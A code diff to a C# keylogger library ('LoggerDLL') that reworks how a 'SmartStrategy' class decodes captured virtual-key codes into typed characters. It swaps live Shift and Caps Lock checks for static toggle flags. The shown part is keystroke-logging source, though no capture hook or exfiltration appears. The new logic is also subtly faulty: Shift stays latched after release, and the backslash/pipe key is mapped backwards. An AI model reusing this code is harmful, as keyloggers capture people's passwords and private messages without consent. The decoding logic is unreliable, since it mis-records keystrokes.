@@ -30,7 +30,7 @@ namespace LoggerDLL
         public void WriteToLog(int vkCode, string path, TextBox form)
         {
             Console.WriteLine(vkCode);
-            form.AppendText("0x"+vkCode.ToString("X"));
+            form.AppendText("0x"+vkCode.ToString("X")+" ");
             
 
         }
@@ -56,11 +56,10 @@ namespace LoggerDLL
 
     public class SmartStrategy : ILoggerWriter
     {
-
-        bool shift = false;
+        static bool isShift;
+        static bool isCapital;
         public void WriteToLog(int vkCode, string path, TextBox text)
         {
-            bool isCapital = Control.IsKeyLocked(Keys.CapsLock);
             switch (vkCode)
             {
                 case VK_BACK:
@@ -73,7 +72,6 @@ namespace LoggerDLL
                     }
                 case VK_RETURN:
                     {
-
                         text.AppendText("\r\n");
                         break;
                     }
@@ -82,11 +80,17 @@ namespace LoggerDLL
                         isCapital = !isCapital;
                         break;
                     }
-                case VK_LSHIFT: { break; }
-                case VK_RSHIFT: { break; }
+                case VK_LSHIFT:
+                    { 
+                    isShift = !isShift;
+                    break;
+                    }
+                case VK_RSHIFT: {
+                    isShift = !isShift;
+                    break; }
                 case VK_0:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText(")");
                         else
                             text.AppendText("0");
@@ -94,7 +98,7 @@ namespace LoggerDLL
                     }
                 case VK_1:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("!");
                         else
                             text.AppendText("1");
@@ -102,7 +106,7 @@ namespace LoggerDLL
                     }
                 case VK_2:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("@");
                         else
                             text.AppendText("2");
@@ -110,7 +114,7 @@ namespace LoggerDLL
                     }
                 case VK_3:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("#");
                         else
                             text.AppendText("3");
@@ -118,7 +122,7 @@ namespace LoggerDLL
                     }
                 case VK_4:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("$");
                         else
                             text.AppendText("4");
@@ -126,7 +130,7 @@ namespace LoggerDLL
                     }
                 case VK_5:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("%");
                         else
                             text.AppendText("5");
@@ -134,7 +138,7 @@ namespace LoggerDLL
                     }
                 case VK_6:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("^");
                         else
                             text.AppendText("6");
@@ -142,7 +146,7 @@ namespace LoggerDLL
                     }
                 case VK_7:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("&");
                         else
                             text.AppendText("7");
@@ -150,7 +154,7 @@ namespace LoggerDLL
                     }
                 case VK_8:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("*");
                         else
                             text.AppendText("8");
@@ -158,7 +162,7 @@ namespace LoggerDLL
                     }
                 case VK_9:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("(");
                         else
                             text.AppendText("9");
@@ -166,7 +170,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_1:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText(":");
                         else
                             text.AppendText(";");
@@ -174,7 +178,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_2:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("?");
                         else
                             text.AppendText("/");
@@ -182,7 +186,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_3:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("~");
                         else
                             text.AppendText("`");
@@ -190,7 +194,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_4:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (    isShift )
                             text.AppendText("{");
                         else
                             text.AppendText("[");
@@ -198,7 +202,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_5:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText(@"\");
                         else
                             text.AppendText("|");
@@ -206,7 +210,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_6:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("}");
                         else
                             text.AppendText("]");
@@ -214,7 +218,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_7:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText(@"""");
                         else
                             text.AppendText("'");
@@ -222,7 +226,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_PERIOD:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText(">");
 
                         else
@@ -231,7 +235,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_COMMA:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("<");
                         else
                             text.AppendText(",");
@@ -239,7 +243,7 @@ namespace LoggerDLL
                     }
                 case VK_OEM_PLUS:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("+");
                         else
                             text.AppendText("=");
@@ -247,16 +251,22 @@ namespace LoggerDLL
                     }
                 case VK_OEM_MINUS:
                     {
-                        if ((Control.ModifierKeys & Keys.Shift) != 0)
+                        if (isShift)
                             text.AppendText("_");
                         else
                             text.AppendText("-");
                         break;
                     }
                 default:
-                    {
-                        if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
+                    {                         
+                        if ((isShift || isCapital) && vkCode >= VK_A && vkCode <= VK_Z)
+                        {
+                            text.AppendText((char)(vkCode) + "");
+                        }
+                        else if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
+                        {
                             text.AppendText((char)(vkCode + 32) + "");
+                        }
                         else
                             text.AppendText((char)vkCode + "");
                         Console.WriteLine((Keys)vkCode);
